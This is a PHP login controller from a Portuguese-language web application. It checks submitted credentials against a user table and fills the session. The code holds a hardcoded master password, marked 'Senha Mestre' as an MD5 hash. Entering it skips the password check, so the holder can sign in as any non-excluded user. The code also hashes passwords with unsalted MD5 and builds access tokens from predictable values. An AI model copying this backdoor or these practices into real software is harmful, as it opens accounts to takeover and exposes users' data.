<?php
	if ($controller == "autentica"){
		$login = tdc::r("login");
		$senha = tdc::r("senha");

		if (($login!="") and ($senha!="")){
			$sqlCriterio1 = tdClass::Criar("sqlcriterio");
			$sqlCriterio2 = tdClass::Criar("sqlcriterio");

			$sqlCriterio1->add(tdClass::Criar("sqlfiltro",array("login",'=',$login)));
			if (md5($senha) != "bf4d9a9fd8ca63472939edad14a91a8d"){ # Senha Mestre
				$sqlCriterio1->add(tdClass::Criar("sqlfiltro",array("senha",'=',md5($senha))));
			}
			$sqlCriterio2->add(tdClass::Criar("sqlfiltro",array("perfilusuario",'<>',1)));
			$sqlCriterio2->add(tdClass::Criar("sqlfiltro",array("perfilusuario",'IS',null)),OU);

			$sql = tdClass::Criar("sqlcriterio");
			$sql->add($sqlCriterio1);
			$sql->add($sqlCriterio2);

			$dataset = tdClass::Criar("repositorio",array(USUARIO))->carregar($sql);
			if ($dataset){

				$_userid		= $dataset[0]->id;
				$_username		= $dataset[0]->nome;
				$access_token	= md5( $login . $senha . date('YmdHmi') );

				Session::append('autenticado'				,true);
				Session::append('userid'					,$_userid);
				Session::append('username'					,$_username);
				Session::append('empresa'					,1);
				Session::append('permitirexclusao'			,$dataset[0]->permitirexclusao==""?0:$dataset[0]->permitirexclusao);
				Session::append('permitirtrocarempresa'		,$dataset[0]->permitirtrocarempresa==""?0:$dataset[0]->permitirtrocarempresa);
				Session::append('usergroup'					,$dataset[0]->grupousuario);
				
				header('x-acesso-token: ' . $access_token);
				$retorno = array(
					"error_code" => 0,
					"error_msg" => "",
					"userid" => $_userid,
					"username" => $_username
				);
			}else{
				$retorno = array(
					"error_code" => 1,
					"error_msg" => "Usu&aacute;rio ou Senha n&atilde;o conferem."
				);
			}
		}else{
			$retorno = array(
				"error_code" => 2,
				"error_msg" => "Campos Login e/ou Senha n&atilde;o podem estar em branco"
			);
		}
		echo json_encode($retorno);
		exit;
	}
	if (!Session::get()->autenticado){
		include PATH_MVC_VIEW . 'autentica.php';
	}